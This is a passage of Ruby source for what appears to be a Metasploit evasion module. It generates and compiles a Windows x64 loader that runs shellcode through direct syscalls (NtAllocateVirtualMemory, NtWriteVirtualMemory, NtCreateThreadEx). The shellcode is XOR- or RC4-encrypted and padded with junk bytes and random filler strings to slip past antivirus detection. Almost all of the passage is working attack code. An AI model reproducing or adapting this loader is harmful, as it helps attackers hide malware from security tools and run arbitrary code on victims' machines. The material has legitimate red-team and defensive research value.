            mov eax, 0x0037 \\n\\
            jmp NtWriteVirtualMemory_Epilogue \\n\\
        NtWriteVirtualMemory_SystemCall_6_1_7601:           \\n\\
            mov eax, 0x0037 \\n\\
            jmp NtWriteVirtualMemory_Epilogue \\n\\
        NtWriteVirtualMemory_SystemCall_6_2_XXXX:           \\n\\
            mov eax, 0x0038 \\n\\
            jmp NtWriteVirtualMemory_Epilogue \\n\\
        NtWriteVirtualMemory_SystemCall_6_3_XXXX:           \\n\\
            mov eax, 0x0039 \\n\\
            jmp NtWriteVirtualMemory_Epilogue \\n\\
        NtWriteVirtualMemory_SystemCall_10_0_10240:         \\n\\
            mov eax, 0x003a \\n\\
            jmp NtWriteVirtualMemory_Epilogue \\n\\
        NtWriteVirtualMemory_SystemCall_10_0_10586:         \\n\\
            mov eax, 0x003a \\n\\
            jmp NtWriteVirtualMemory_Epilogue \\n\\
        NtWriteVirtualMemory_SystemCall_10_0_14393:         \\n\\
            mov eax, 0x003a \\n\\
            jmp NtWriteVirtualMemory_Epilogue \\n\\
        NtWriteVirtualMemory_SystemCall_10_0_15063:         \\n\\
            mov eax, 0x003a \\n\\
            jmp NtWriteVirtualMemory_Epilogue \\n\\
        NtWriteVirtualMemory_SystemCall_10_0_16299:         \\n\\
            mov eax, 0x003a \\n\\
            jmp NtWriteVirtualMemory_Epilogue \\n\\
        NtWriteVirtualMemory_SystemCall_10_0_17134:         \\n\\
            mov eax, 0x003a \\n\\
            jmp NtWriteVirtualMemory_Epilogue \\n\\
        NtWriteVirtualMemory_SystemCall_10_0_17763:         \\n\\
            mov eax, 0x003a \\n\\
            jmp NtWriteVirtualMemory_Epilogue \\n\\
        NtWriteVirtualMemory_SystemCall_10_0_18362:         \\n\\
            mov eax, 0x003a \\n\\
            jmp NtWriteVirtualMemory_Epilogue \\n\\
        NtWriteVirtualMemory_SystemCall_10_0_18363:         \\n\\
            mov eax, 0x003a \\n\\
            jmp NtWriteVirtualMemory_Epilogue \\n\\
        NtWriteVirtualMemory_SystemCall_10_0_19041:         \\n\\
            mov eax, 0x003a \\n\\
            jmp NtWriteVirtualMemory_Epilogue \\n\\
        NtWriteVirtualMemory_SystemCall_10_0_19042:         \\n\\
            mov eax, 0x003a \\n\\
            jmp NtWriteVirtualMemory_Epilogue \\n\\
        NtWriteVirtualMemory_SystemCall_Unknown:            \\n\\
            ret \\n\\
        NtWriteVirtualMemory_Epilogue: \\n\\
            mov r10, rcx \\n\\
            syscall \\n\\
            ret \\n\\
        ");
        ^
  end

  def headers
    @headers = "#include <windows.h>\n"
    @headers << "#include \"#{INCLUDE_DIR}\"\n" if datastore['CIPHER'] == 'rc4'
    @headers
  end

  def defines
    %^
        typedef struct _PS_ATTRIBUTE
        {
            ULONG  Attribute;
            SIZE_T Size;
            union
            {
                ULONG Value;
                PVOID ValuePtr;
            } u1;
            PSIZE_T ReturnLength;
        } PS_ATTRIBUTE, *PPS_ATTRIBUTE;

        typedef struct _UNICODE_STRING
        {
            USHORT Length;
            USHORT MaximumLength;
            PWSTR  Buffer;
        } UNICODE_STRING, *PUNICODE_STRING;

        typedef struct _OBJECT_ATTRIBUTES
        {
            ULONG           Length;
            HANDLE          RootDirectory;
            PUNICODE_STRING ObjectName;
            ULONG           Attributes;
            PVOID           SecurityDescriptor;
            PVOID           SecurityQualityOfService;
        } OBJECT_ATTRIBUTES, *POBJECT_ATTRIBUTES;

        typedef struct _PS_ATTRIBUTE_LIST
        {
            SIZE_T       TotalLength;
            PS_ATTRIBUTE Attributes[1];
        } PS_ATTRIBUTE_LIST, *PPS_ATTRIBUTE_LIST;


        typedef struct _CLIENT_ID
        {
            HANDLE UniqueProcess;
            HANDLE UniqueThread;
        } CLIENT_ID, *PCLIENT_ID;

        EXTERN_C NTSTATUS NtClose(
            IN HANDLE Handle);

        EXTERN_C NTSTATUS NtOpenProcess(
            OUT PHANDLE ProcessHandle,
            IN ACCESS_MASK DesiredAccess,
            IN POBJECT_ATTRIBUTES ObjectAttributes,
            IN PCLIENT_ID ClientId OPTIONAL);


        EXTERN_C NTSTATUS NtWaitForSingleObject(
            IN HANDLE ObjectHandle,
            IN BOOLEAN Alertable,
            IN PLARGE_INTEGER TimeOut OPTIONAL);

        EXTERN_C NTSTATUS NtAllocateVirtualMemory(
            IN HANDLE ProcessHandle,
            IN OUT PVOID * BaseAddress,
            IN ULONG ZeroBits,
            IN OUT PSIZE_T RegionSize,
            IN ULONG AllocationType,
            IN ULONG Protect);

        EXTERN_C NTSTATUS NtCreateThreadEx(
            OUT PHANDLE ThreadHandle,
            IN ACCESS_MASK DesiredAccess,
            IN POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL,
            IN HANDLE ProcessHandle,
            IN PVOID StartRoutine,
            IN PVOID Argument OPTIONAL,
            IN ULONG CreateFlags,
            IN SIZE_T ZeroBits,
            IN SIZE_T StackSize,
            IN SIZE_T MaximumStackSize,
            IN PPS_ATTRIBUTE_LIST AttributeList OPTIONAL);


        EXTERN_C NTSTATUS NtWriteVirtualMemory(
            IN HANDLE ProcessHandle,
            IN PVOID BaseAddress,
            IN PVOID Buffer,
            IN SIZE_T NumberOfBytesToWrite,
            OUT PSIZE_T NumberOfBytesWritten OPTIONAL);
        ^
  end

  def filler
    %(
            char* #{Rex::Text.rand_text_alpha(3..10)} = "#{Rex::Text.rand_mail_address}";
            char* #{Rex::Text.rand_text_alpha(3..10)} = "#{Rex::Text.rand_mail_address}";
            char* #{Rex::Text.rand_text_alpha(3..10)} = "#{Rex::Text.rand_name} #{Rex::Text.rand_surname}";
            char* #{Rex::Text.rand_text_alpha(3..10)} = "#{Rex::Text.rand_mail_address}";
            char* #{Rex::Text.rand_text_alpha(3..10)} = "#{Rex::Text.rand_guid}";
            char* #{Rex::Text.rand_text_alpha(3..10)} = "#{Rex::Text.rand_guid}";
            char* #{Rex::Text.rand_text_alpha(3..10)} = "#{Rex::Text.rand_guid}";
            char* #{Rex::Text.rand_text_alpha(3..10)} = "#{Rex::Text.rand_guid}";
            char* #{Rex::Text.rand_text_alpha(3..10)} =  "#{Rex::Text.rand_name} #{Rex::Text.rand_surname}";
            char* #{Rex::Text.rand_text_alpha(3..10)} =  "#{Rex::Text.rand_name} #{Rex::Text.rand_surname}";
        )
  end

  def exec_func
    %^
        #{get_payload}
        #{Rex::Text.to_c key, Rex::Text::DefaultWrap, 'key'}
        DWORD exec(void *buffer)
        {
            void (*function)();
            function = (void (*)())buffer;
            function();
        }
        ^
  end

  def inject
    s = "Sleep(#{datastore['SLEEP']})"
    @inject = %@

        void inject()
        {
            HANDLE pHandle;
            CLIENT_ID cID = {0};
            OBJECT_ATTRIBUTES OA = {0};
            SIZE_T size = sizeof(shellcode);
            PVOID bAddress = NULL;
            int process_id = GetCurrentProcessId();
            cID.UniqueProcess = process_id;
            NtOpenProcess(&pHandle, PROCESS_ALL_ACCESS, &OA, &cID);
            NtAllocateVirtualMemory(pHandle, &bAddress, 0, &size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
            int n = 0;
            @
    if datastore['CIPHER'] == 'rc4'
      @inject << %@
            char* temp = (char*)malloc(sizeof(shellcode));
            RC4(key, shellcode, temp, sizeof(shellcode));
            for (int i = 0; i < sizeof(shellcode) - 1; i++)
            {
                NtWriteVirtualMemory(pHandle, (LPVOID)((ULONG_PTR)bAddress + n), &temp[i], 1, NULL);
                n++;
            }
            @
    else
      @inject << %@
            for (int i = 0; i < sizeof(shellcode) - 1; i++)
            {
                char temp = shellcode[i] ^ key[0] ^ key[1] ^ key[2] ^ key[3] ^ key[4] ^ key[5] ^ key[6];
                NtWriteVirtualMemory(pHandle, (LPVOID)((ULONG_PTR)bAddress + n), &temp, 1, NULL);
                n++;
            }
            @
    end
    @inject << %@
            #{s if datastore['SLEEP'] > 0};
            #{s if datastore['SLEEP'] > 0};
            HANDLE thread = NULL;
            NtCreateThreadEx(&thread, THREAD_ALL_ACCESS, NULL, pHandle, exec, bAddress, NULL, NULL, NULL, NULL, NULL);
            WaitForSingleObject(thread, INFINITE);
            NtClose(thread);
            NtClose(pHandle);
        }
        @
  end

  def main
    %^
        int main()
        {
            #{filler if datastore['JUNK']}
            inject();
        }
        ^
  end

  def key
    if datastore['CIPHER'] == 'rc4'
      @key ||= Rex::Text.rand_text_alpha(32..64)
    else
      @key ||= Rex::Text.rand_text(7)
    end
  end

  def get_payload
    junk = Rex::Text.rand_text(10..1024)
    p = payload.encoded + junk
    vprint_status("Payload size: #{p.size} = #{payload.encoded.size} + #{junk.size} (junk)")
    if datastore['CIPHER'] == 'xor'
      key.each_byte { |x| p = Rex::Text.xor(x, p) }
      Rex::Text.to_c p, Rex::Text::DefaultWrap, 'shellcode'
    else
      opts = { format: 'rc4', key: key }
      Msf::Simple::Buffer.transform(p, 'c', 'shellcode', opts)
    end
  end

  def generate_code(src, opts = {})
    comp_obj = Metasploit::Framework::Compiler::Mingw::X64.new(opts)
    compiler_out = comp_obj.compile_c(src)
    unless compiler_out.empty?
      elog(compiler_out)
      raise Metasploit::Framework::Compiler::Mingw::UncompilablePayloadError, 'Compilation error. Check the logs for further information.'
    end
    comp_file = "#{opts[:f_name]}.exe"
    raise Metasploit::Framework::Compiler::Mingw::CompiledPayloadNotFoundError unless File.exist?(comp_file)

    bin = File.binread(comp_file)
    file_create(bin)
    comp_obj.cleanup_files
  end

  def run
    comp_opts = '-masm=intel -w -mwindows '
    src = headers
    src << defines
    src << nt_alloc
    src << nt_close
    src << nt_create_thread
    src << nt_open_process
    src << nt_wait
    src << nt_write
    src << exec_func
    src << inject
    src << main
    path = Tempfile.new('main').path
    vprint_status path
    compile_opts =
      {
        strip_symbols: true,
        compile_options: comp_opts,
        f_name: path,
        opt_lvl: datastore['OptLevel']
      }
    generate_code src, compile_opts
  end

end
